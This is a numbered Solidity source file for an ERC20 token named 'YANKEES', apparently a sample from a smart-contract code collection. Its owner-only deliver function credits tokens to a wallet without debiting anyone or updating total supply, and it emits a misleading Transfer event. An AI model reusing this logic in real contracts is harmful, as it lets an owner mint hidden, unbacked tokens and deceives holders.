row number 
1	       pragma solidity ^0.4.24;
2	 library SafeMath {
3	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a * b;
5	 assert(a == 0 || c / a == b);
6	 return c;
7	 }
8	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
9	 assert(b > 0);
10	 uint256 c = a / b;
11	 assert(a == b * c + a % b);
12	 return c;
13	 }
14	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
15	 assert(b <= a);
16	 return a - b;
17	 }
18	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
19	 uint256 c = a + b;
20	 assert(c >= a);
21	 return c;
22	 }
23	 }
24	 contract Ownable {
25	 address public owner;
26	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
27	 function Ownable() public {
28	 owner = msg.sender;
29	 }
30	 modifier onlyOwner() {
31	 require(msg.sender == owner);
32	 _;
33	 }
34	 function transferOwnership(address newOwner) onlyOwner public {
35	 require(newOwner != address(0));
36	 OwnershipTransferred(owner, newOwner);
37	 owner = newOwner;
38	 }
39	 }
40	 contract ERC20Interface {
41	 function totalSupply() public constant returns (uint);
42	 function balanceOf(address tokenOwner) public constant returns (uint balance);
43	 function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
44	 function transfer(address to, uint tokens) public returns (bool success);
45	 function approve(address spender, uint tokens) public returns (bool success);
46	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
47	 event Transfer(address indexed from, address indexed to, uint tokens);
48	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
49	 }
50	 interface OldFACEToken {
51	 function transfer(address receiver, uint amount) external;
52	 function balanceOf(address _owner) external returns (uint256 balance);
53	 function showMyTokenBalance(address addr) external;
54	 }
55	 contract YANKEES is ERC20Interface,Ownable {
56	 using SafeMath for uint256;
57	 uint256 public totalSupply;
58	 mapping(address => uint256) tokenBalances;
59	 string public constant name = "YANKEES";
60	 string public constant symbol = "YANK";
61	 uint256 public constant decimals = 18;
62	 uint256 public constant INITIAL_SUPPLY = 10000000;
63	 address ownerWallet;
64	 mapping (address => mapping (address => uint256)) allowed;
65	 event Debug(string message, address addr, uint256 number);
66	 function YANKEES (address wallet) public {
67	 owner = msg.sender;
68	 ownerWallet=wallet;
69	 totalSupply = INITIAL_SUPPLY * 10 ** 18;
70	 tokenBalances[wallet] = INITIAL_SUPPLY * 10 ** 18;
71	 }
72	 function transfer(address _to, uint256 _value) public returns (bool) {
73	 require(tokenBalances[msg.sender]>=_value);
74	 tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(_value);
75	 tokenBalances[_to] = tokenBalances[_to].add(_value);
76	 Transfer(msg.sender, _to, _value);
77	 return true;
78	 }
79	 function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
80	 require(_to != address(0));
81	 require(_value <= tokenBalances[_from]);
82	 require(_value <= allowed[_from][msg.sender]);
83	 tokenBalances[_from] = tokenBalances[_from].sub(_value);
84	 tokenBalances[_to] = tokenBalances[_to].add(_value);
85	 allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
86	 Transfer(_from, _to, _value);
87	 return true;
88	 }
89	 function approve(address _spender, uint256 _value) public returns (bool) {
90	 allowed[msg.sender][_spender] = _value;
91	 Approval(msg.sender, _spender, _value);
92	 return true;
93	 }
94	 function totalSupply() public constant returns (uint) {
95	 return totalSupply - tokenBalances[address(0)];
96	 }
97	 function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
98	 return allowed[tokenOwner][spender];
99	 }
100	 function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
101	 allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
102	 Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
103	 return true;
104	 }
105	 function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
106	 uint oldValue = allowed[msg.sender][_spender];
107	 if (_subtractedValue > oldValue) {
108	 allowed[msg.sender][_spender] = 0;
109	 }
110	 else {
111	 allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
112	 }
113	 Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
114	 return true;
115	 }
116	 function () public payable {
117	 revert();
118	 }
119	 function balanceOf(address _owner) constant public returns (uint256 balance) {
120	 return tokenBalances[_owner];
121	 }
122	 function deliver(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
123	 require(tokenBalances[buyer]<=tokenAmount);
124	 tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
125	 Transfer(buyer, wallet, tokenAmount);
126	 }
127	 function showMyTokenBalance(address addr) public view returns (uint tokenBalance) {
128	 tokenBalance = tokenBalances[addr];
129	 }
130	 }
